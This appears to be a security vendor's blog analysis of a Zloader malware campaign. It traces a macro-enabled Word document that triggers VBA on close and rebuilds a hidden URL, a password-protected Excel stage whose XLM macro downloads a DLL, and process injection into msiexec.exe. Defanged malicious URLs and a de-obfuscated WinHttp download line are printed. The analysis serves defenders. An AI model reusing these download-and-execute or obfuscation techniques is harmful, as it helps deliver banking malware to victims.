                    <div class="blog-detail-content">                                        
                        <p>Zloader aka Terdot &#8211; a variant of the infamous Zeus <a href="https://blogs.quickheal.com/banking-malware-dridex-bounces-back-pdf/">banking malware</a> is well known for aggressively using &#8220;.xls&#8221;, &#8220;.xlsx&#8221; documents as its initial vector to deliver its payload. Despite this, recently we have come across &#8220;.docm&#8221; file which is being used by Zoader family to perform its initial activity. This shows adversaries like to experiment with office documents to avoid being detected by security solutions.</p>
<div id="attachment_89699" style="width: 616px" class="wp-caption aligncenter"><img aria-describedby="caption-attachment-89699" loading="lazy" class=" wp-image-89699" src="https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-1.png" alt="" width="606" height="189" srcset="https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-1.png 709w, https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-1-300x94.png 300w, https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-1-650x203.png 650w" sizes="(max-width: 606px) 100vw, 606px" /><p id="caption-attachment-89699" class="wp-caption-text"><em>        Fig.1-Attack Chain</em></p></div>
<p><b>Initial Vector:</b></p>
<p>Here infection chain starts with &#8220;.docm&#8221; file. Docm stands for &#8220;Macro-enabled office word document&#8221;. We can see below, the document view asking user to enable content.</p>
<div id="attachment_89701" style="width: 650px" class="wp-caption aligncenter"><img aria-describedby="caption-attachment-89701" loading="lazy" class=" wp-image-89701" src="https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-2.png" alt="" width="640" height="382" srcset="https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-2.png 1138w, https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-2-300x179.png 300w, https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-2-650x388.png 650w, https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-2-768x458.png 768w, https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-2-789x471.png 789w, https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-2-250x150.png 250w" sizes="(max-width: 640px) 100vw, 640px" /><p id="caption-attachment-89701" class="wp-caption-text"><em>            Fig.2- Document View</em></p></div>
<p>Like many other documents, we tried to observe its activity after enabling content but there was no activity in it. By  looking at its VBA code, we got our answer. Enabling content will not do execution of macro. Here macro execution  starts on “Document close” as shown.</p>
<div id="attachment_89702" style="width: 689px" class="wp-caption aligncenter"><img aria-describedby="caption-attachment-89702" loading="lazy" class=" wp-image-89702" src="https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-3.png" alt="" width="679" height="230" srcset="https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-3.png 852w, https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-3-300x102.png 300w, https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-3-650x220.png 650w, https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-3-768x261.png 768w, https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-3-789x268.png 789w" sizes="(max-width: 679px) 100vw, 679px" /><p id="caption-attachment-89702" class="wp-caption-text"><em>                 Fig.3- Macro Function Call</em></p></div>
<p>As soon as victim close this document, function “<i>nnn” </i>gets called which is the main function of this VBA macro. In this, again sub functions  are being called. Here adversaries also make use of “Userform” to perform next stage activity.</p>
<div id="attachment_89703" style="width: 536px" class="wp-caption aligncenter"><img aria-describedby="caption-attachment-89703" loading="lazy" class=" wp-image-89703" src="https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-4.png" alt="" width="526" height="303" srcset="https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-4.png 698w, https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-4-300x173.png 300w, https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-4-650x374.png 650w" sizes="(max-width: 526px) 100vw, 526px" /><p id="caption-attachment-89703" class="wp-caption-text"><em>              Fig.4- Sub Function Call</em></p></div>
<p>UserForm_Initialize() function is used to invoke “Userform2”. Below image shows the userform2 object. In its dialog box, url data is  chunked and overlapped on 25th ComboBox to hide actual data as shown below.</p>
<div id="attachment_89704" style="width: 521px" class="wp-caption aligncenter"><img aria-describedby="caption-attachment-89704" loading="lazy" class="wp-image-89704 size-large" src="https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-5-511x390.png" alt="" width="511" height="390" srcset="https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-5-511x390.png 511w, https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-5-300x229.png 300w, https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-5.png 633w" sizes="(max-width: 511px) 100vw, 511px" /><p id="caption-attachment-89704" class="wp-caption-text"><em>           Fig.5- Hidden URL Data</em></p></div>
<p>After going through all ComboBox of userform2, we were able to locate malicious url which is used to download 2nd stage payload.</p>
<div id="attachment_89705" style="width: 582px" class="wp-caption aligncenter"><img aria-describedby="caption-attachment-89705" loading="lazy" class=" wp-image-89705" src="https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-6.png" alt="" width="572" height="292" srcset="https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-6.png 799w, https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-6-300x153.png 300w, https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-6-650x332.png 650w, https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-6-768x392.png 768w, https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-6-789x403.png 789w" sizes="(max-width: 572px) 100vw, 572px" /><p id="caption-attachment-89705" class="wp-caption-text"><em>         Fig.6- Chunked URL Data</em></p></div>
<p>To sum up above activity, adversaries are making use of for loop to access all these values and create final url as shown  below,</p>
<div id="attachment_89706" style="width: 594px" class="wp-caption aligncenter"><img aria-describedby="caption-attachment-89706" loading="lazy" class=" wp-image-89706" src="https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-7.png" alt="" width="584" height="347" srcset="https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-7.png 751w, https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-7-300x178.png 300w, https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-7-650x386.png 650w, https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-7-250x150.png 250w" sizes="(max-width: 584px) 100vw, 584px" /><p id="caption-attachment-89706" class="wp-caption-text"><em>                        Fig.7- Creation of URL on Document Close</em></p></div>
<p>Site “<i>hxxps[:]//feelingfit-always[.]com/1[.]php</i>” which is malicious having score 11 on virus total, is used to download password protected XLS file. Its password is hidden again in VBA macro in &#8220;Userform1&#8221;. By exploring userform1 data,  we were able to extract hidden password.</p>
<div id="attachment_89707" style="width: 711px" class="wp-caption aligncenter"><img aria-describedby="caption-attachment-89707" loading="lazy" class=" wp-image-89707" src="https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-8.png" alt="" width="701" height="85" srcset="https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-8.png 932w, https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-8-300x36.png 300w, https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-8-650x79.png 650w, https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-8-768x93.png 768w, https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-8-789x96.png 789w" sizes="(max-width: 701px) 100vw, 701px" /><p id="caption-attachment-89707" class="wp-caption-text"><em>                        Fig.8- Macro Code to protect XLS with password</em></p></div>
<div id="attachment_89708" style="width: 688px" class="wp-caption aligncenter"><img aria-describedby="caption-attachment-89708" loading="lazy" class=" wp-image-89708" src="https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-9.png" alt="" width="678" height="367" srcset="https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-9.png 754w, https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-9-300x162.png 300w, https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-9-650x352.png 650w" sizes="(max-width: 678px) 100vw, 678px" /><p id="caption-attachment-89708" class="wp-caption-text"><em>                Fig.9- XLS Hidden Password</em></p></div>
<p><b>2</b><b>nd</b><b> Stage Payload:</b></p>
<p>Protecting document with password is classic technique to defend against AV vendors. Correct password is necessary to dig further into  analysis. After matching above password, we can finally see excel workbook content. XLM macro is used in “Sheet3” to perform further activity.</p>
<div id="attachment_89709" style="width: 726px" class="wp-caption aligncenter"><img aria-describedby="caption-attachment-89709" loading="lazy" class=" wp-image-89709" src="https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-10.png" alt="" width="716" height="388" srcset="https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-10.png 1084w, https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-10-300x162.png 300w, https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-10-650x352.png 650w, https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-10-768x416.png 768w, https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-10-789x427.png 789w" sizes="(max-width: 716px) 100vw, 716px" /><p id="caption-attachment-89709" class="wp-caption-text"><em>      Fig.10- XLS Workbook</em></p></div>
<p>Here code is embedded in different cells of document. Below figure shows the extracted macro code from above   workbook:</p>
<div id="attachment_89710" style="width: 780px" class="wp-caption aligncenter"><img aria-describedby="caption-attachment-89710" loading="lazy" class=" wp-image-89710" src="https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-11.png" alt="" width="770" height="383" srcset="https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-11.png 1118w, https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-11-300x149.png 300w, https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-11-650x323.png 650w, https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-11-768x382.png 768w, https://blogs.quickheal.com/wp-content/uploads/2021/03/Fig-11-789x392.png 789w" sizes="(max-width: 770px) 100vw, 770px" /><p id="caption-attachment-89710" class="wp-caption-text"><em>        Fig.11- XLM Macro Code</em></p></div>
<p>Here adversaries make use of excel inbuilt functions like IIF and Switch to obfuscate data. Final de-obfuscated code can be seen as below,</p>
<p><em>       WinHttp.WinHttpRequest.5.1.open GET https[:]//santarosafuneralhome[.]com/2.php  False</em></p>
<p><em>       WinHttp.WinHttpRequest.5.1.SetRequestHeader</em></p>
<p><em>       WinHttp.WinHttpRequest.5.1.send</em></p>
<p>Above malicious url having virus total score 8 is used to download 3rd stage payload of this attack.</p>
<p><b>Final Payload Analysis:</b></p>
<p>The DLL is the final payload of Zloader. Here the DLL is highly obfuscated and avoids direct calls to the Windows APIs. Hashing is used to  calculate the addresses and makes the call with the calculated values, making the reversing difficult.</p>
<p>&nbsp;</p>
<div id="attachment_89748" style="width: 576px" class="wp-caption aligncenter"><img aria-describedby="caption-attachment-89748" loading="lazy" class=" wp-image-89748" src="https://blogs.quickheal.com/wp-content/uploads/2021/03/Untitled.png" alt="" width="566" height="477" srcset="https://blogs.quickheal.com/wp-content/uploads/2021/03/Untitled.png 700w, https://blogs.quickheal.com/wp-content/uploads/2021/03/Untitled-300x253.png 300w, https://blogs.quickheal.com/wp-content/uploads/2021/03/Untitled-463x390.png 463w" sizes="(max-width: 566px) 100vw, 566px" /><p id="caption-attachment-89748" class="wp-caption-text">Fig.12 &#8211; Code for address calculation</p></div>
<p>The DLL creates process <i>‘msiexec.exe’</i>, which is a genuine<i> </i>Microsoft process that belongs to Windows Component installer, in suspended  mode and injects encrypted file to it.</p>
<div id="attachment_89714" style="width: 705px" class="wp-caption aligncenter"><img aria-describedby="caption-attachment-89714" loading="lazy" class=" wp-image-89714" src="https://blogs.quickheal.com/wp-content/uploads/2021/03/3_CreateProcess_snip.png" alt="" width="695" height="288" srcset="https://blogs.quickheal.com/wp-content/uploads/2021/03/3_CreateProcess_snip.png 1248w, https://blogs.quickheal.com/wp-content/uploads/2021/03/3_CreateProcess_snip-300x125.png 300w, https://blogs.quickheal.com/wp-content/uploads/2021/03/3_CreateProcess_snip-650x270.png 650w, https://blogs.quickheal.com/wp-content/uploads/2021/03/3_CreateProcess_snip-768x319.png 768w, https://blogs.quickheal.com/wp-content/uploads/2021/03/3_CreateProcess_snip-789x327.png 789w" sizes="(max-width: 695px) 100vw, 695px" /><p id="caption-attachment-89714" class="wp-caption-text"><em>                 Fig.13- &#8216;msiexec.exe&#8217; created in suspended mode</em></p></div>
<div id="attachment_89715" style="width: 702px" class="wp-caption aligncenter"><img aria-describedby="caption-attachment-89715" loading="lazy" class=" wp-image-89715" src="https://blogs.quickheal.com/wp-content/uploads/2021/03/4_WPM_file_snip.png" alt="" width="692" height="135" srcset="https://blogs.quickheal.com/wp-content/uploads/2021/03/4_WPM_file_snip.png 970w, https://blogs.quickheal.com/wp-content/uploads/2021/03/4_WPM_file_snip-300x58.png 300w, https://blogs.quickheal.com/wp-content/uploads/2021/03/4_WPM_file_snip-650x127.png 650w, https://blogs.quickheal.com/wp-content/uploads/2021/03/4_WPM_file_snip-768x150.png 768w, https://blogs.quickheal.com/wp-content/uploads/2021/03/4_WPM_file_snip-789x154.png 789w" sizes="(max-width: 692px) 100vw, 692px" /><p id="caption-attachment-89715" class="wp-caption-text"><em>                 Fig.14- Encrypted file injected in &#8216;msiexec.exe&#8217;</em></p></div>
<p>It also injects a routine that will decrypt and bring the malicious PE out for execution.</p>
<div id="attachment_89716" style="width: 690px" class="wp-caption aligncenter"><img aria-describedby="caption-attachment-89716" loading="lazy" class=" wp-image-89716" src="https://blogs.quickheal.com/wp-content/uploads/2021/03/5_Decryption_Routine.png" alt="" width="680" height="300" srcset="https://blogs.quickheal.com/wp-content/uploads/2021/03/5_Decryption_Routine.png 939w, https://blogs.quickheal.com/wp-content/uploads/2021/03/5_Decryption_Routine-300x132.png 300w, https://blogs.quickheal.com/wp-content/uploads/2021/03/5_Decryption_Routine-650x287.png 650w, https://blogs.quickheal.com/wp-content/uploads/2021/03/5_Decryption_Routine-768x339.png 768w, https://blogs.quickheal.com/wp-content/uploads/2021/03/5_Decryption_Routine-789x348.png 789w" sizes="(max-width: 680px) 100vw, 680px" /><p id="caption-attachment-89716" class="wp-caption-text"><em>            Fig.15- Decryption Routine</em></p></div>
<p>With the setting of thread context, the initial execution point is passed and finally the injected code is executed with the resume thread.</p>
<p>When this thread of <i>msiexec.exe</i> comes into execution, it tries to make connection to its CnC servers as shown,</p>
<p><img loading="lazy" class=" wp-image-89717 aligncenter" src="https://blogs.quickheal.com/wp-content/uploads/2021/03/6_Cnc.png" alt="" width="641" height="147" srcset="https://blogs.quickheal.com/wp-content/uploads/2021/03/6_Cnc.png 492w, https://blogs.quickheal.com/wp-content/uploads/2021/03/6_Cnc-300x69.png 300w" sizes="(max-width: 641px) 100vw, 641px" /></p>
<p>&nbsp;</p>
<p>Since these urls were down at the time of analysis, we were not able to go further deeper into it.</p>
<p><b>Conclusion:</b></p>
<p>This type of attack shows how adversaries innovate their mechanism to start infection chain to compromise victim. User should always be  cautious while opening any office files. <a href="https://www.quickheal.co.in/" rel="nofollow noopener" target="_blank">Quick Heal</a> and <a href="https://www.seqrite.com/" rel="nofollow noopener" target="_blank">Seqrite enterprise security solutions</a> protect its customers from such files. So, remember to keep the endpoint security solutions always updated.</p>
